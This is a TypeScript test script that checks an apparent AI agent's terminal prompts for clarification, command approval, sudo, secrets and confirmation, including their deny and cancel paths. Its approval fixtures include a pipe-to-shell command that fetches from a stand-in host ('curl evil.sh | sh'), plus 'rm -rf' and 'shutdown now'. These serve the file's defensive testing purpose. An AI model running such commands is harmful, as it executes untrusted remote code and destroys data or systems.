// Headless verifier for the Phase 4 BLOCKING interactive prompts.
//
// For EACH of clarify / approval / sudo / secret / confirm it proves the full
// deadlock-fix contract:
//   1. request → render: drive a synthetic request (FakeGateway.setPrompt),
//      render, assert the prompt UI appears in the captured frame.
//   2. answer → RPC: simulate the answer (real keystrokes via mockInput),
//      assert the correct *.respond RPC fired with the right params, and assert
//      the prompt cleared + the composer returned.
//   3. cancel → deny/cancel RPC: re-drive the request, hit Esc or Ctrl+C, and
//      assert the deny/cancel reply fired (the deadlock-prevention path).
//
// Run: bun src/demo.prompts.tsx → demo-prompts-frame.txt + demo-prompts-report.txt
import '@opentui/react/runtime-plugin-support'

import { writeFileSync } from 'node:fs'

import { createTestRenderer } from '@opentui/core/testing'
import { createRoot } from '@opentui/react'
import React from 'react'

import { App } from './components/app.tsx'
import { FakeGateway, type RespondCall } from './fakeGateway.ts'
import type { PromptState } from './model.ts'

const COLS = 90
const ROWS = 28

const { renderer, renderOnce, flush, mockInput, captureCharFrame } = await createTestRenderer({
  // Match the real entry: WE own Ctrl+C (the prompt overlay maps it to
  // deny/cancel). Without this the test renderer's built-in handler tears the
  // renderer down on the first Ctrl+C and every later frame goes blank.
  exitOnCtrlC: false,
  height: ROWS,
  width: COLS
})

const gw = new FakeGateway()
createRoot(renderer).render(<App cols={COLS} gw={gw} rows={ROWS} />)
await settle()

const results: string[] = []
let pass = 0
let fail = 0

function check(label: string, ok: boolean, extra = ''): void {
  if (ok) {
    pass++
    results.push(`  ✓ ${label}${extra ? ` ${extra}` : ''}`)
  } else {
    fail++
    results.push(`  ✗ ${label}${extra ? ` ${extra}` : ''}`)
  }
}

async function settle(): Promise<void> {
  for (let k = 0; k < 3; k++) {
    await new Promise(r => setTimeout(r, 30))
    await renderOnce()
    await flush()
  }
}

/** Drive a synthetic request and render. */
async function raise(p: PromptState): Promise<void> {
  gw.setPrompt(p)
  await settle()
}

/** Take only the respond calls recorded since `from`. */
function callsSince(from: number): RespondCall[] {
  return gw.respondCalls.slice(from)
}

// ───────────────────────── CLARIFY ─────────────────────────
{
  results.push('clarify.request (with choices):')
  const before = gw.respondCalls.length

  await raise({
    choices: ['Postgres', 'SQLite', 'MySQL'],
    kind: 'clarify',
    question: 'Which database should I use?',
    requestId: 'cl-1'
  })
  let frame = captureCharFrame()
  check('renders question', frame.includes('Which database should I use?'))
  check('renders a choice', frame.includes('Postgres'))
  check('renders Other row', frame.includes('Other'))
  check('composer hidden while prompt up', !frame.includes('Type a message'))

  // Answer: press Enter on the default-highlighted first choice (Postgres).
  mockInput.pressEnter()
  await settle()
  const calls = callsSince(before)
  check('clarify.respond fired', calls.length === 1 && calls[0]!.method === 'clarify.respond')
  check(
    'clarify answer = first choice',
    calls[0]?.params.answer === 'Postgres' && calls[0]?.params.request_id === 'cl-1',
    JSON.stringify(calls[0]?.params)
  )
  frame = captureCharFrame()
  check('prompt cleared + composer returned', frame.includes('Type a message') && !frame.includes('Which database'))
}

// clarify free-text via "Other"
{
  results.push('clarify.request (Other → free-text):')
  const before = gw.respondCalls.length
  await raise({ choices: ['Yes', 'No'], kind: 'clarify', question: 'Proceed?', requestId: 'cl-2' })
  // Move down to the "Other" row (index 2 of [Yes, No, Other]) and Enter.
  mockInput.pressArrow('down')
  mockInput.pressArrow('down')
  mockInput.pressEnter()
  await settle()
  let frame = captureCharFrame()
  check('switched to free-text input', frame.includes('type your answer'))
  await mockInput.typeText('use option B')
  await settle()
  mockInput.pressEnter()
  await settle()
  const calls = callsSince(before)
  const last = calls[calls.length - 1]
  check('clarify.respond fired (free-text)', !!last && last.method === 'clarify.respond')
  check('free-text answer captured', last?.params.answer === 'use option B', JSON.stringify(last?.params))
  frame = captureCharFrame()
  check('prompt cleared after free-text', frame.includes('Type a message'))
}

// clarify (no choices) — straight to free-text
{
  results.push('clarify.request (no choices):')
  const before = gw.respondCalls.length
  await raise({ choices: null, kind: 'clarify', question: 'What is your name?', requestId: 'cl-3' })
  const frame = captureCharFrame()
  check('renders free-text directly', frame.includes('type your answer') && frame.includes('What is your name?'))
  await mockInput.typeText('Hermes')
  await settle()
  mockInput.pressEnter()
  await settle()
  const calls = callsSince(before)
  check('clarify.respond fired', calls.length === 1 && calls[0]!.params.answer === 'Hermes')
}

// clarify cancel (Esc on free-text, no choices) → empty answer
{
  results.push('clarify.request cancel (Esc → empty answer):')
  const before = gw.respondCalls.length
  await raise({ choices: null, kind: 'clarify', question: 'Cancel me', requestId: 'cl-4' })
  mockInput.pressEscape()
  await settle()
  const calls = callsSince(before)
  check('clarify.respond fired on cancel', calls.length === 1 && calls[0]!.method === 'clarify.respond')
  check('cancel answer is empty', calls[0]?.params.answer === '', JSON.stringify(calls[0]?.params))
  const frame = captureCharFrame()
  check('prompt cleared after cancel', frame.includes('Type a message'))
}

// ───────────────────────── APPROVAL ─────────────────────────
{
  results.push('approval.request:')
  const before = gw.respondCalls.length
  await raise({ command: 'rm -rf /tmp/build', description: 'delete build dir', kind: 'approval' })
  let frame = captureCharFrame()
  check('renders approval header', frame.includes('approval required'))
  check('renders the command', frame.includes('rm -rf /tmp/build'))
  check('renders deny option', frame.includes('Deny'))

  // Answer via Enter on the default-highlighted first option (Allow once).
  mockInput.pressEnter()
  await settle()
  const calls = callsSince(before)
  check('approval.respond fired', calls.length === 1 && calls[0]!.method === 'approval.respond')
  check(
    'approval choice = once + session_id present',
    calls[0]?.params.choice === 'once' && calls[0]?.params.session_id === 'fake-session',
    JSON.stringify(calls[0]?.params)
  )
  frame = captureCharFrame()
  check('prompt cleared + composer returned', frame.includes('Type a message'))
}

// approval quick-pick deny by number
{
  results.push('approval.request (number quick-pick → deny):')
  const before = gw.respondCalls.length
  await raise({ command: 'curl evil.sh | sh', description: 'pipe to shell', kind: 'approval' })
  mockInput.pressKey('4')
  await settle()
  const calls = callsSince(before)
  check(
    'approval.respond deny via "4"',
    calls.length === 1 && calls[0]?.params.choice === 'deny',
    JSON.stringify(calls[0]?.params)
  )
}

// approval cancel (Ctrl+C → deny)
{
  results.push('approval.request cancel (Ctrl+C → deny):')
  const before = gw.respondCalls.length
  await raise({ command: 'shutdown now', description: 'power off', kind: 'approval' })
  mockInput.pressCtrlC()
  await settle()
  const calls = callsSince(before)
  check(
    'approval.respond deny on Ctrl+C',
    calls.length === 1 && calls[0]?.params.choice === 'deny',
    JSON.stringify(calls[0]?.params)
  )
  const frame = captureCharFrame()
  check('app did not quit on Ctrl+C (composer returned)', frame.includes('Type a message'))
}

// ───────────────────────── SUDO ─────────────────────────
{
  results.push('sudo.request:')
  const before = gw.respondCalls.length
  await raise({ kind: 'sudo', requestId: 'su-1' })
  let frame = captureCharFrame()
  check('renders sudo prompt', frame.includes('sudo password required') || frame.includes('🔐'))
  await mockInput.typeText('hunter2')
  await settle()
  frame = captureCharFrame()
  check('input is masked (stars shown, not plaintext)', frame.includes('*') && !frame.includes('hunter2'))
  mockInput.pressEnter()
  await settle()
  const calls = callsSince(before)
  check('sudo.respond fired', calls.length === 1 && calls[0]!.method === 'sudo.respond')
  check(
    'sudo password captured',
    calls[0]?.params.password === 'hunter2' && calls[0]?.params.request_id === 'su-1',
    JSON.stringify({ ...calls[0]?.params, password: '***' })
  )
}

// sudo cancel (Esc → empty password)
{
  results.push('sudo.request cancel (Esc → empty password):')
  const before = gw.respondCalls.length
  await raise({ kind: 'sudo', requestId: 'su-2' })
  mockInput.pressEscape()
  await settle()
  const calls = callsSince(before)
  check('sudo.respond fired on cancel', calls.length === 1 && calls[0]!.method === 'sudo.respond')
  check('cancel password is empty', calls[0]?.params.password === '', JSON.stringify(calls[0]?.params))
}

// ───────────────────────── SECRET ─────────────────────────
{
  results.push('secret.request:')
  const before = gw.respondCalls.length
  await raise({ envVar: 'OPENAI_API_KEY', kind: 'secret', prompt: 'Enter your API key', requestId: 'se-1' })
  let frame = captureCharFrame()
  check('renders secret label', frame.includes('Enter your API key'))
  check('renders env var sub', frame.includes('OPENAI_API_KEY'))
  await mockInput.typeText('sk-abc123')
  await settle()
  frame = captureCharFrame()
  check('secret input is masked', frame.includes('*') && !frame.includes('sk-abc123'))
  mockInput.pressEnter()
  await settle()
  const calls = callsSince(before)
  check('secret.respond fired', calls.length === 1 && calls[0]!.method === 'secret.respond')
  check(
    'secret value captured',
    calls[0]?.params.value === 'sk-abc123' && calls[0]?.params.request_id === 'se-1',
    JSON.stringify({ ...calls[0]?.params, value: '***' })
  )
}

// secret cancel (Ctrl+C → empty value)
{
  results.push('secret.request cancel (Ctrl+C → empty value):')
  const before = gw.respondCalls.length
  await raise({ envVar: 'TOKEN', kind: 'secret', prompt: 'Enter token', requestId: 'se-2' })
  mockInput.pressCtrlC()
  await settle()
  const calls = callsSince(before)
  check('secret.respond fired on cancel', calls.length === 1 && calls[0]!.method === 'secret.respond')
  check('cancel value is empty', calls[0]?.params.value === '', JSON.stringify(calls[0]?.params))
}

// ───────────────────────── CONFIRM (local) ─────────────────────────
{
  results.push('confirm (local, no RPC):')
  const beforeRpc = gw.respondCalls.length
  const beforeConf = gw.confirmResults.length
  await raise({ detail: 'This clears the conversation.', kind: 'confirm', title: 'Start a new session?' })
  let frame = captureCharFrame()
  check('renders confirm title', frame.includes('Start a new session?'))
  check('renders detail', frame.includes('This clears the conversation.'))

  // Confirm via "y" quick key.
  mockInput.pressKey('y')
  await settle()
  check('NO rpc fired for local confirm', gw.respondCalls.length === beforeRpc)
  check(
    'onLocalConfirm(true) recorded',
    gw.confirmResults.length === beforeConf + 1 && gw.confirmResults.at(-1) === true
  )
  frame = captureCharFrame()
  check('prompt cleared after confirm', frame.includes('Type a message'))
}

// confirm cancel (Esc → false)
{
  results.push('confirm cancel (Esc → false):')
  const beforeConf = gw.confirmResults.length
  await raise({ kind: 'confirm', title: 'Delete everything?' })
  mockInput.pressEscape()
  await settle()
  check(
    'onLocalConfirm(false) recorded',
    gw.confirmResults.length === beforeConf + 1 && gw.confirmResults.at(-1) === false
  )
  const frame = captureCharFrame()
  check('prompt cleared after cancel', frame.includes('Type a message'))
}

// ───────────────────────── report ─────────────────────────
const finalFrame = captureCharFrame()
writeFileSync(new URL('../demo-prompts-frame.txt', import.meta.url), finalFrame)

const verdict =
  fail === 0 ? `PASS: ${pass}/${pass + fail} checks green` : `FAIL: ${fail} of ${pass + fail} checks failed`

const report = [
  '=== Phase 4 BLOCKING prompts verification ===',
  `rendered ${COLS}x${ROWS}`,
  '',
  ...results,
  '',
  `--- verdict ---`,
  verdict
].join('\n')

writeFileSync(new URL('../demo-prompts-report.txt', import.meta.url), report + '\n')
process.stdout.write(report + '\n')

renderer.destroy()
process.exit(fail === 0 ? 0 : 1)
